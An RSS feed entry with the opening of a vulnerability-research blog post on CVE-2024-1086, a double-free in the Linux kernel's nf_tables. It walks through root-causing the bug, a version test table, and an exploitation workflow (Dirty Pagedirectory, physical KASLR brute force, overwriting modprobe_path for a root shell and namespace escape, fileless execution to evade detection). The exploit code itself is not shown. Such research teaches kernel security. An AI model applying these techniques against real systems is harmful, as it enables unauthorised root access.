<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Pwning Tech]]></title><description><![CDATA[Explore offensive security: vulnerability research, pwn, and web exploitation, in the form of kernel zerodays, Internet-of-Things exploits, and fuzzing experiments.]]></description><link>https://pwning.tech/</link><image><url>https://pwning.tech/favicon.png</url><title>Pwning Tech</title><link>https://pwning.tech/</link></image><generator>Ghost 5.75</generator><lastBuildDate>Tue, 26 Mar 2024 13:43:51 GMT</lastBuildDate><atom:link href="https://pwning.tech/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[Flipping Pages: An analysis of a new Linux vulnerability in nf_tables and hardened exploitation techniques]]></title><description><![CDATA[A tale about exploiting KernelCTF Mitigation, Debian, and Ubuntu instances with a double-free in nf_tables in the Linux kernel, using novel techniques like Dirty Pagedirectory. All without even having to recompile the exploit for different kernel targets once.]]></description><link>https://pwning.tech/nftables/</link><guid isPermaLink="false">658f44f8d32e980001de21f5</guid><category><![CDATA[Linux Kernel]]></category><category><![CDATA[CVE-2024-1086]]></category><category><![CDATA[nf_tables]]></category><category><![CDATA[Dirty Pagedirectory]]></category><category><![CDATA[Dirty Pagetable]]></category><category><![CDATA[KernelCTF]]></category><category><![CDATA[Physical KASLR]]></category><category><![CDATA[Pagetables]]></category><category><![CDATA[PCP Allocator]]></category><category><![CDATA[Binary Exploitation]]></category><category><![CDATA[Zeroday]]></category><category><![CDATA[Exploit]]></category><category><![CDATA[TLB Flushing]]></category><category><![CDATA[modprobe_path]]></category><category><![CDATA[PoC]]></category><category><![CDATA[Proof of Concept]]></category><dc:creator><![CDATA[notselwyn]]></dc:creator><pubDate>Tue, 26 Mar 2024 11:45:00 GMT</pubDate><content:encoded><![CDATA[<p>This blogpost is the next instalment of my series of hands-on no-boilerplate vulnerability research blogposts, intended for time-travellers in the future who want to do Linux kernel vulnerability research. Specifically, I hope beginners will learn from my VR workflow and the seasoned researchers will learn from my techniques.</p><p>In this blogpost, I&apos;m discussing a bug I found in nf_tables in the Linux kernel (<a href="https://www.cvedetails.com/cve/CVE-2024-1086/">CVE-2024-1086</a>) and its root cause analysis. Then, I show several novel techniques I used to drop a universal root shell on nearly all Linux kernels between at least v5.14 and v6.6.14 (unpriv userns required) without even recompiling the exploit. This is possible because of the data-only, KSMA ambience of the exploit. Among those targeted kernels are Ubuntu kernels, recent Debian kernels, and one of the most hardened Linux kernels out there (KernelCTF mitigation kernels). </p><p>Additionally, I&apos;m providing the proof-of-concept source code (also available in the <a href="https://github.com/Notselwyn/CVE-2024-1086" rel="noreferrer">CVE-2024-1086 PoC repository</a> on Github). As a bonus, I wanted to challenge myself by making the exploit support fileless execution (which helps in CNO and avoids detections in pentests), and by not making any changes to the disk whatsoever (including setting /bin/sh to SUID 0 et cetera).</p><p>This blogpost aims to be a supplementary guide to the original&#xA0;<a href="https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html">Dirty Pagetable blogpost</a>&#xA0;as well, considering there were not any blogposts covering the practical bits (e.g. TLB flushing for exploits) when I started writing this blogpost. Additionally, I hope the skb-related techniques will be embedded in remote network-based exploits (e.g. bugs in IPv4, if they still exist), and I hope that the Dirty Pagedirectory technique will be utilized for LPE exploits. Let&apos;s get to the good stuff!</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/03/-cover_better-4.svg" class="kg-image" alt loading="lazy" width="3471" height="2297"><figcaption><span style="white-space: pre-wrap;">Blogpost image cover: birdseye view of exploit including the vulnerability and some of the techniques for visual purposes.</span></figcaption></figure><h2 id="0-before-you-read">0. Before you read</h2><h3 id="01-how-to-read-this-blogpost">0.1. How to read this blogpost</h3><p>To the aspiring vulnerability researchers: I wrote this blogpost in a way that slightly represents a research paper in terms of the format, because the format happens to be exactly what I was looking for: it is easy to scan and cherrypick knowledge from even though it may be a big pill to swallow. Because research papers are considered hard to read by many people, I&apos;d like to give steps on how I would read this blogpost to extract knowledge efficiently:</p><ol><li>Read the overview section (check if the content is even interesting to you)</li><li>Split-screen this blogpost (reading and looking up)</li><li>Skip to the bug section (try to understand how the bug works)</li><li>Skip to the proof of concept section (walk through the exploit)</li></ol><p>If things are not clear, utilize the background and/or techniques section. If you want to learn more about a specific topic, I have attached an external article for most sections.</p><h3 id="02-affected-kernel-versions">0.2. Affected kernel versions</h3><p>This section contains information about the affected kernel versions for this exploit, which is useful when looking up existing techniques for exploiting a bug. Based on these observations, it seems feasable that all versions from atleast (including) v5.14.21 to (including) v6.6.14 are exploitable, depending on the kconfig values (details below). This means that at the time of writing, the stable branches <code>linux-5.15.y</code>, <code>linux-6.1.y</code>, and <code>linux-6.6.y</code> are affected by this exploit, and perhaps <code>linux-6.7.1</code> as well. Fortunately for the users, a bugfix in the stable branches has been released in February 2024.</p><blockquote>Note that the same base config file was reused for most vanilla kernels, and that the mentioned versions are all vulnerable to the PoC bug. The base config was generated with <code>kernel-hardening-checker</code>. Additionally, if a version isn&apos;t affected by the bug, yet the exploitation techniques work, it will not be displayed in the table.</blockquote><p>For vanilla kernels, <code>CONFIG_INIT_ON_FREE_DEFAULT_ON</code> was toggled off in the config, which sets a page to null-bytes after free - which thwarts the skb part of for the exploit. This config value is toggled off in major distro&apos;s like KernelCTF, Ubuntu, and Debian, so I consider this an acceptable measure. However, <code>CONFIG_INIT_ON_ALLOC_DEFAULT_ON</code> remains toggled on, as this is part of the Ubuntu and Debian kernel config. Unfortunately, this causes <code>bad_page()</code> detection as an side-effect in versions starting from v6.4.0. When <code>CONFIG_INIT_ON_ALLOC_DEFAULT_ON</code> is toggled off, the exploit is working up to (including) v6.6.4. </p><p>The <strong>success rate </strong>for the exploit is <strong>99.4%</strong> (n=1000) - sometimes with drops to 93.0% (n=1000) - on Linux kernel v6.4.16, with the setup as below (and the kernelctf filesystem). I do not expect the success rate to deviate much across versions, although it might deviate per device workload. I consider an exploit working for a particular setup if it succeeds all attempts at trying it out (manual verification, so usually 1-2 tries). Because of the high success rate, it is pretty easy to filter out if the exploit works or not. Additionally, all fails have been investigated and hence have their reasons been included in the table, so false positives are unlikely.</p><p>All non-obsolete techniques (and the resulting PoC) are tested on setups:</p><figure class="kg-card kg-code-card"><pre><code class="language-markdown">| Kernel | Kernel Version | Distro    | Distro Version    | Working/Fail | CPU Platform      | CPU Cores | RAM Size | Fail Reason                                                                           | Test Status | Config URL                                                                                                                               |
|--------|----------------|-----------|-------------------|--------------|-------------------|-----------|----------|---------------------------------------------------------------------------------------|-------------|------------------------------------------------------------------------------------------------------------------------------------------|
| Linux  | v5.4.270       | n/a       | n/a               | fail         | QEMU x86_64       | 8         | 16GiB    | [CODE] pre-dated nft code (denies rule alloc)                                         | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.4.270.config               |
| Linux  | v5.10.209      | n/a       | n/a               | fail         | QEMU x86_64       | 8         | 16GiB    | [TCHNQ] BUG mm/slub.c:4118                                                            | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.10.209.config              |
| Linux  | v5.14.21       | n/a       | n/a               | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.14.21.config               |
| Linux  | v5.15.148      | n/a       | n/a               | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.15.148.config              |
| Linux  | v5.16.20       | n/a       | n/a               | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.16.20.config               |
| Linux  | v5.17.15       | n/a       | n/a               | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.17.15.config               |
| Linux  | v5.18.19       | n/a       | n/a               | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.18.19.config               |
| Linux  | v5.19.17       | n/a       | n/a               | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.19.17.config               |
| Linux  | v6.0.19        | n/a       | n/a               | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v6.0.19.config                |
| Linux  | v6.1.55        | KernelCTF | Mitigation v3     | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-kernelctf-mitigationv3-v6.1.55.config |
| Linux  | v6.1.69        | Debian    | Bookworm 6.1.0-17 | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-debian-v6.1.0-17-amd64.config         |
| Linux  | v6.1.69        | Debian    | Bookworm 6.1.0-17 | working      | AMD Ryzen 5 7640U | 6         | 32GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-debian-v6.1.0-17-amd64.config         |
| Linux  | v6.1.72        | KernelCTF | LTS               | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-kernelctf-lts-v6.1.72.config          |
| Linux  | v6.2.?         | Ubuntu    | Jammy v6.2.0-37   | working      | AMD Ryzen 5 7640U | 6         | 32GiB    | n/a                                                                                   | final       |                                                                                                                                          |
| Linux  | v6.2.16        | n/a       | n/a               | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v6.2.16.config                |
| Linux  | v6.3.13        | n/a       | n/a               | working      | QEMU x86_64       | 8         | 16GiB    | n/a                                                                                   | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v6.3.13.config                |
| Linux  | v6.4.16        | n/a       | n/a               | fail         | QEMU x86_64       | 8         | 16GiB    | [TCHNQ] bad page: page-&gt;_mapcount != -1 (-513), bcs CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v6.4.16.config                |
| Linux  | v6.5.3         | Ubuntu    | Jammy v6.5.0-15   | fail         | QEMU x86_64       | 8         | 16GiB    | [TCHNQ] bad page: page-&gt;_mapcount != -1 (-513), bcs CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-ubuntu-jammy-v6.5.0-15.config         |
| Linux  | v6.5.13        | n/a       | n/a               | fail         | QEMU x86_64       | 8         | 16GiB    | [TCHNQ] bad page: page-&gt;_mapcount != -1 (-513), bcs CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v6.5.13.config                |
| Linux  | v6.6.14        | n/a       | n/a               | fail         | QEMU x86_64       | 8         | 16GiB    | [TCHNQ] bad page: page-&gt;_mapcount != -1 (-513), bcs CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v6.6.14.config                |
| Linux  | v6.7.1         | n/a       | n/a               | fail         | QEMU x86_64       | 8         | 16GiB    | [CODE] nft verdict value incorrect is altered by kernel                               | final       | https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v6.7.1.config                 |</code></pre><figcaption><p><span style="white-space: pre-wrap;">Table 0.2.1: An overview of the exploit test results per tested kernel versions and their setups.</span></p></figcaption></figure><h2 id="1-overview">1. Overview</h2><h3 id="11-abstract">1.1. Abstract</h3><p>In this blogpost I present several novel techniques I used to exploit a 0-day double-free bug in hardened Linux kernels (i.e. KernelCTF mitigation instances) with 93%-99% success rate. The underlying bug is input sanitization failure of netfilter verdicts. Hence, the requirements for the exploit are that nf_tables is enabled and unprivileged user namespaces are enabled. The exploit is data-only and performs an kernel-space mirroring attack (KSMA) from userland with the  novel Dirty Pagedirectory technique (pagetable confusion), where it is able to link any physical address (and its permissions) to virtual memory addresses by performing <em>just </em>read/writes to userland addresses.</p><h3 id="12-workflow">1.2. Workflow</h3><p>To trigger the bug leading to the double-free, I add a Netfilter rule to an unprivileged-user namespace. The Netfilter rule contains an expression which sets a malicious verdict value, which will make the internal nf_tables kernel code interpret <code>NF_DROP</code> at first, after which it will free the skb, and then return <code>NF_ACCEPT</code> so the packet handling continues, and it will double-free the skb. Then, I trigger this rule by allocating an 16-page IP packet (so that it gets allocated by the buddy-allocator and not the PCP-allocator or slab-allocator, and it shares a cache across CPUs) which has migratetype 0.</p><p>In order to delay the 2nd free (so I can avoid corruption by doing stuff), I abuse the IP fragmenation logic of an IP packet. This allows us to make an skb &quot;wait&quot; in an IP fragmentation queue without being freed for an arbitrary amount of seconds. In order to traverse this code path with corrupted packet metadata, I spoof IP source address 1.1.1.1 and destination address 255.255.255.255. However, this means we get to deal with Reverse Path Forwarding (RPF), so we need to disable it in our networking namespace (does not require root privileges).</p><p>To achieve unlimited R/W to any physical memory address (including kernel addresses), I present the Dirty Pagedirectory technique. This technique is - softly said - pagetable confusion, by allocating an PTE page and PMD page to the same physical page. </p><p>Unfortunately, these pagetable pages are <code>migratetype==0 order==0</code> pages allocated with <code>alloc_pages()</code>, and skb heads (the double-free&apos;d objects) are allocated with kmalloc, which means the slab-allocator is used for page <code>order&lt;=1</code>, the PCP-allocator is used for <code>order&lt;=3</code>, and the buddy-allocator for <code>order&gt;=4</code>. To avoid hassle (explained in detail in the blogpost), we have to use <code>order&gt;=4</code> pages for the double-free. This also means we cannot directly use a double-free on buddy-allocator pages (<code>order&gt;=4</code>) to double allocate PTE/PMD pages (<code>order==0</code>), but I discovered methods to achieve this. </p><p>To double allocate PTE/PMD pages with the kmalloc-based double-free, I present 2 methods:</p><p><strong>The better page conversion technique (PCP draining)</strong><br>In this simpler, more stable, and faster method we take advantage of the fact that the PCP-allocator is simply a per-CPU freelist, which is refilled with pages from the buddy-allocator when it is drained. Hence, we can simply free <code>order==4</code> (16) pages to the buddy-allocator freelist, drain the PCP list, and refill the <code>order==0</code> PCP list with 64 pages from the buddy-allocator freelist, containing said 16 pages.</p><p><strong>The original page conversion technique (racecondition)</strong><br>This method relies on a race-condition and hence only works in virtualized environments such as QEMU VMs, where terminal IO causes a substantial delay in the VMs kernel. We take advantage of a WARN() message which causes ~50-300ms delay to trigger a race condition, to free an <code>order==4</code> buddy page to an <code>order==0</code> PCP freelist. As you may notice, this does not work on real hardware (as the delay is ~1ms) and is therefore replaced with the method above. Unfortunately, I used this technique for the original kernelctf exploit.</p><p>Between the double-free, I make sure the page refcounts never go to 0 since it would deny freeing the page (possibly as a double-free mitigation). Additionally, I spray skb objects into the <code>skbuff_head_cache</code> slabcache of the same CPU to avoid experimental freelist corruption detection in the kernelctf mitigation instance, and to increase stability in general. </p><p>When the double-free primitive is achieved, I will use a new technique called Dirty Pagedirectory to achieve unlimited read/write to any physical address. This requires double-allocating a page table entry (PTE) page and a page middle directory (PMD) page to the same address. When writing an arbitrary PTE value containing page permissions and page physical address to a page within the span of the PTE page, the PMD page will interpret said address when trying to dereference the PTE value&apos;s page within the PMD pages&apos; span. This boils down to setting a PTE value to <code>0xDEADBEEF</code> entirely from userland, and then dereference that PTE value from userland again to access the page referenced to by <code>0xDEADBEEF</code> using the flags (including but not limited to permissions) set in <code>0xDEADBEEF</code>.</p><p>In order to utilize this unlimited R/W primitive, we need to flush the TLB. After reading several impractical research papers I came up with my own complex flushing algorithm to flush TLBs in Linux from userland: calling fork() and munmap()&apos;ing the flushed VMA. In order to avoid crashes when the child exits the program, I make the child thread go to sleep indefinitely.</p><p>I utilize this unlimited physical memory access to bruteforce physical KASLR (which is accelerated because the physical kernel base is aligned with <code>CONFIG_PHYSICAL_START</code> (a.k.a. <code>0x100&apos;0000</code> / 16MiB) or - when defined - <code>CONFIG_PHYSICAL_ALIGN</code> (a.k.a. <code>0x20&apos;0000</code> / 2MiB) and leak the physical kernel base address by checking 2MiB worth of pages on a machine with 8GiB memory (assuming 16MiB alignment), which even fits into the area of a single overwritten PTE page. To detect the kernel, I used the <a href="https://github.com/notselwyn/get-sig" rel="noreferrer">get-sig</a> scripts which generate a highly precise fingerprint of files, like recent Linux kernels across compilers, and slapped that into my exploit. </p><p>In order to find <code>modprobe_path</code>, I do a fairly simplistic <code>&quot;/sbin/modprobe&quot; + &quot;\x00&quot; * ...</code> memory scan across 80MiB beyond the detected kernel base to get access to <code>modprobe_path</code>. To verify that the &quot;real&quot; <code>modprobe_path</code> variable was found instead of a false-positive, I overwrite <code>modprobe_path</code> and check if <code>/proc/sys/kernel/modprobe</code> (read-only user interface for <code>modprobe_path</code>) reflects this change. If <code>CONFIG_STATIC_USERMODEHELPER</code> is enabled, it will just check for <code>&quot;/sbin/usermode-helper&quot;</code>.</p><p>In order to drop a root shell (including an namespace escape) I overwrite <code>modprobe_path</code> or <code>&quot;/sbin/usermode-helper&quot;</code> to the exploits&apos; memfd file descriptor containing the privesc script, such as <code>/proc/&lt;pid&gt;/fd/&lt;fd&gt;</code>. This fileless approach allows the exploit to be ran on an entire read-only filesystem (it being bootstrapped using perl). The PID has to be bruteforced if the exploit is running in a namespace - because the exploit only knows the namespace PID - but is luckily incredibly fast since we don&apos;t need to flush the TLB as we aren&apos;t changing the physical address of the PTE. This will essentially be writing the string to a userland address and executing a file.</p><p>In the privesc script, we will execute a <code>/bin/sh</code> process (as root) and hook the exploits&apos; file descriptors (<code>/dev/&lt;pid&gt;/fd/&lt;fd&gt;</code>) to the shells&apos; file descriptors, allowing us to achieve a namespace escape. The advantage of this method is that it&apos;s very versatile, as it works on local terminals and reverse shells, all without depending on filesystems and other forms of isolation. </p><h2 id="2-background-info">2. Background info</h2><h3 id="21-nftables">2.1. nf_tables</h3><p>One of the in-tree Linux kernel modules is <code>nf_tables</code>. In recent versions of <code>iptables</code> - which is one of the most popular firewall tools out there - the <code>nf_tables</code> kernel module is the backend. <code>iptables</code> itself is part of the <code>ufw</code> backend. In order to decide which packets will pass the firewall, nftables uses a state machine with user-issued rules. </p><h4 id="211-netfilter-hierarchy">2.1.1. Netfilter Hierarchy</h4><p>These rules come in the following orders (i.e. one table contains many chains, one chain contains many rules, one rule contains many expressions):</p><ul><li>Tables (which protocol)</li><li>Chains (which trigger)</li><li>Rules (state machine functions)</li><li>Expressions (state machine instructions)</li></ul><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/02/nf_tables-4.svg" class="kg-image" alt loading="lazy" width="703" height="423"><figcaption><span style="white-space: pre-wrap;">Illustration 2.1.1.1: Nftables hierarchy overview of tables, chains, rules and expressions.</span></figcaption></figure><p>This allows users to program complex firewall rules, because nftables has many atomic expressions which can be chained together in rules to filter packets. Additionally, it allows chains to be ran at different times in the packet processing code (i.e. before routing and after routing) which can be selected when creating a chain using flags like <code>NF_INET_LOCAL_IN</code> and <code>NF_INET_POST_ROUTING</code>. Due to this extremely customizable nature, nftables is known to be incredibly insecure. Hence, many vulnerabilities have been reported and have been fixed already. </p><p>To learn more about nftables, I recommend this blogpost by @pqlqpql which goes into the deepest trenches of nftables: <a href="https://blog.dbouman.nl/2022/04/02/How-The-Tables-Have-Turned-CVE-2022-1015-1016/">&quot;How The Tables Have Turned: An analysis of two new Linux vulnerabilities in nf_tables.&quot;</a></p><h4 id="212-netfilter-verdicts">2.1.2. Netfilter Verdicts</h4><p>More relevant to the blogpost are Netfilter verdicts. A verdict is a decision by a Netfilter ruleset about a certain packet trying to pass the firewall. For example, it may be a drop or an accept. If the rule decides to drop the packet, Netfilter will stop processing the packet. On the contrary, if the rule decides to accept the packet, Netfilter will continue processing the packet until the packet passes all rules. At the time of writing, all the verdicts are:</p><ul><li>NF_DROP: Drop the packet, stop processing it.</li><li>NF_ACCEPT: Accept the packet, continue processing it.</li><li>NF_STOLEN: Stop processing, the hook needs to free it.</li><li>NF_QUEUE: Let userland application process it.</li><li>NF_REPEAT: Call the hook again.</li><li>NF_STOP (deprecated): Accept the packet, stop processing it in Netfilter.</li></ul><h3 id="22-skbuff-skb">2.2. sk_buff (skb)</h3><p>To describe network data (including IP packets, ethernet frames, WiFi frames, etc.) the Linux kernel uses the sk_buff structure and commonly calls them skb&apos;s as shorthand. To represent a packet, the kernel uses 2 objects which are important to us: the <code>sk_buff</code> object itself which contains kernel meta-data for skb handling, and the <code>sk_buff-&gt;head</code> object which contains the actual packet content like the IP header and the IP packets&apos; body.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/02/sk_buff_struct-4.svg" class="kg-image" alt loading="lazy" width="931" height="602"><figcaption><span style="white-space: pre-wrap;">Illustration 2.2.1: Overview of the sk_buff structure&apos;s data buffer and its length field.</span></figcaption></figure><p>In order to use values from the IP header (since IP packets are parsed in the kernel afterall), the kernel does type punning with IP header struct and the <code>sk_buff-&gt;head</code> object using <code>ip_hdr()</code>. This pattern gets applied across the kernel since it allows for quick header parsing. As a matter of fact, the type punning trick is also used to parse ELF headers when executing a binary.</p><p>To learn more, check this excelent Linux kernel documentation page: <a href="https://docs.kernel.org/networking/skbuff.html">&quot;struct sk_buff - The Linux Kernel.&quot;</a></p><h3 id="23-ip-packet-fragmentation">2.3. IP packet fragmentation</h3><p>One of the features of IPv4 is packet fragmentation. This allows packets to be transmitted using multiple IP fragments. Fragments are just regular IP packets, except that they do not contain the full packet size specified in its IP header and it having the <code>IP_MF</code> flag set in the header. </p><p>The general calculation for the IP packet length in an IP fragments&apos; header is <code>iph-&gt;len = sizeof(struct ip_header) * frags_n + total_body_length</code>. In the Linux kernel, all fragments for a single IP packet are stored into the same red-black tree (called an IP frag queue) until all fragments have been received. In order to filter out which fragment belongs at which offset when reassembling, the IP fragment offset is required: <code>iph-&gt;offset = body_offset &gt;&gt; 3</code>, whereby <code>body_offset</code> is the offset in the final IP body, and thus excluding any IP header lengths which may be used when calculating <code>iph-&gt;len</code>. As you may notice, fragment data has to be aligned with 8 bytes because the specs specify that the upper 3 bits of the offset field are used for flags (i.e. <code>IP_MF</code> and <code>IP_DF</code>). If we want to transmit 64 bytes of data across 2 fragments whose size are respectively 8 bytes and 56 bytes, we should format it like the code below. The kernel would then reassemble the IP packet as &apos;A&apos; * 64.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">iph1-&gt;len = sizeof(struct ip_header)*2 + 64;
iph1-&gt;offset = ntohs(0 | IP_MF); // set MORE FRAGMENTS flag 
memset(iph1_body, &apos;A&apos;, 8); 
transmit(iph1, iph1_body, 8); 

iph2-&gt;len = sizeof(struct ip_header)*2 + 64; 
iph2-&gt;offset = ntohs(8 &gt;&gt; 3); // don&apos;t set IP_MF since this is the last packet 
memset(iph2_body, &apos;A&apos;, 56); 
transmit(iph2, iph2_body, 56);</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 2.3.1: C psuedocode describing the IP header format of IP fragments.</span></p></figcaption></figure><p>To learn more about packet fragmentation, check this blogpost by PacketPushers: <a href="https://packetpushers.net/ip-fragmentation-in-detail/" rel="noreferrer">&quot;IP Fragmentation in Detail.&quot;</a></p><h3 id="24-page-allocation">2.4. Page allocation</h3><p>There are 3 major ways to allocate pages in the Linux kernel: using the slab-allocator, the buddy-allocator and the per-cpu page (PCP) allocator. In short: the buddy-allocator is invoked with <code>alloc_pages()</code>, can be used for any page order (0-&gt;10), and allocates pages from a global pool of pages across CPUs. The PCP-allocator is also invoked with <code>alloc_pages()</code>, and can be used to allocate pages with order 0-&gt;3 from a per-CPU pool of pages. Additionally, there&apos;s the slab-allocator, which is invoked with <code>kmalloc()</code> and can allocate pages with order 0-&gt;1 (including smaller allocations) from specialized per-CPU freelists/caches.</p><p>The PCP-allocator exists because the buddy-allocator locks access when a CPU is allocating a page from the global pool, and hence blocks another CPU when it wants to allocate a page. The PCP-allocator prevents this by having a smaller per-CPU pool of pages which are allocated in bulk by the buddy-allocator in the background. This way, the chance of page allocation blockage is smaller.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/02/pageallocatorbailywick.svg" class="kg-image" alt loading="lazy" width="753" height="306"><figcaption><span style="white-space: pre-wrap;">Illustration 2.4.1: Overview of available page allocators per order.</span></figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/02/pageallocations-3.svg" class="kg-image" alt loading="lazy" width="701" height="823"><figcaption><span style="white-space: pre-wrap;">Illustration 2.4.2: Activity diagram of the page allocation process, starting from kmalloc().</span></figcaption></figure><p>To learn more about the buddy-allocator and the PCP-allocator, check the Page Allocation section of this extensive analysis: <a href="https://gitlab.com/gitlab-com/gl-infra/scalability/-/issues/2387#user-content-page-allocator">&quot;Reference: Analyzing Linux kernel memory management anomalies.&quot;</a></p><h3 id="25-physical-memory">2.5. Physical memory</h3><h4 id="251-physical-to-virtual-memory-mappings">2.5.1. Physical-to-virtual memory mappings</h4><p>One of the most fundamental elements of the kernel is memory management. When we are talking about memory, we could be talking about 2 types of memory: physical memory and virtual memory. Physical memory is what the RAM chips use, and virtual memory is how programs (including the kernel) running on the CPU interact with the physical memory. Of course when we use gdb to debug a binary, all addresses we use are virtual - since gdb and the underlying program is such a program as well. </p><p>Essentially, virtual memory is built on top of physical memory. The advantage of this model is that the virtual address range is larger than the physical address range - since empty virtual memory pages can be unmapped - which is good for ASLR efficiency among other things. Additionally, we can map 1 physical page to many virtual pages, or let there be an illusion that there are 128TiB addresses whilst in practice most of these are not backed by an actual page. </p><p>This means that we can work with 128TiB virtual memory ranges per process on a system with only 4GiB of physical memory. In theory, we could even map a single physical page of 4096 <code>\x41</code> bytes to all 128TiB worth of userland virtual pages. When a program wants to write a <code>\x42</code> byte to a virtual page, we perform copy-on-write (COW) and create a 2nd physical page and map that page to just the virtual page that the program wrote to. </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/02/phys_virt_mem-1.svg" class="kg-image" alt loading="lazy" width="783" height="283"><figcaption><span style="white-space: pre-wrap;">Illustration 2.5.1.1: Mappings between virtual and physical memory pages. </span></figcaption></figure><p>In order to translate virtual memory addresses to physical memory addresses, the CPU utilizes pagetables. So when our userland program tries to read (virtual memory) address <code>0xDEADBEEF</code>, the CPU will essentially do <code>mov rax, [0xDEADBEEF]</code>. However, in order to actually read the value from the RAM chips, the CPU needs to convert the virtual memory address <code>0xDEADBEEF</code> to an physical memory address. </p><p>This translation is oblivious to the kernel and our userland program when it is trying to access a virtual memory address. To perform this translation, the CPU performs a lookup in the Translation Lookaside Buffer (TLB) - which exists in the MMU - which caches the virtual-to-physical address translations. If the virtual <code>0xDEADBEEF</code> address (or more specifically, the virtual <code>0xDEADB000</code> page) has been recently accessed, the TLB does not have to traverse the pagetables (the next section), and will have the physical address beloning to the virtual address in cache. Otherwise, if the address is not in the TLB cache, the TLB needs to traverse the pagetables to get the physical address. This will be covered in the next subsection.</p><p>To learn more about physical memory, check this excellent <a href="https://read.seas.harvard.edu/cs161/2023/doc/memory-layout/" rel="noreferrer">memory layout page from a Harvards Operating Systems course</a>.</p><h4 id="252-pagetables">2.5.2. Pagetables</h4><p>When the TLB gets requested a physical address for a virtual address which is not in its cache, it performs a &quot;pagewalk&quot; to acquire the physical address of a virtual address. A pagewalk means traversing the pagetables, which are a few nested arrays, with the physical addresses in the bottom arrays.<strong><em> </em></strong></p><blockquote>Note that the diagram below uses pagetable indices of 9 bits (because <code>2**9 = 512</code> pagetable values fit into a single page). Additionally, we are using 4-level pagetables here, but the kernel also supports 5-level, 3-level, et cetera.</blockquote><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/03/pagetables_with_bits-1.webp" class="kg-image" alt loading="lazy" width="2000" height="745" srcset="https://pwning.tech/content/images/size/w600/2024/03/pagetables_with_bits-1.webp 600w, https://pwning.tech/content/images/size/w1000/2024/03/pagetables_with_bits-1.webp 1000w, https://pwning.tech/content/images/size/w1600/2024/03/pagetables_with_bits-1.webp 1600w, https://pwning.tech/content/images/size/w2400/2024/03/pagetables_with_bits-1.webp 2400w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">Illustration 2.5.2.1: An example of virtual address to physical address translation.</span></figcaption></figure><blockquote>This model of nested arrays is used because it saves a lot of memory. Instead of allocating a huge array for 128TiB of virtual addresses, it instead divides it into several smaller arrays with each layer having a smaller bailiwick. This means that tables responsible for an unallocated area will not be allocated. </blockquote><p>Traversing the pagetables is a very inexpensive process since it are essentially 4-5 array dereferences. The indices for these dereferences are - get ready to have your mind blown - embedded 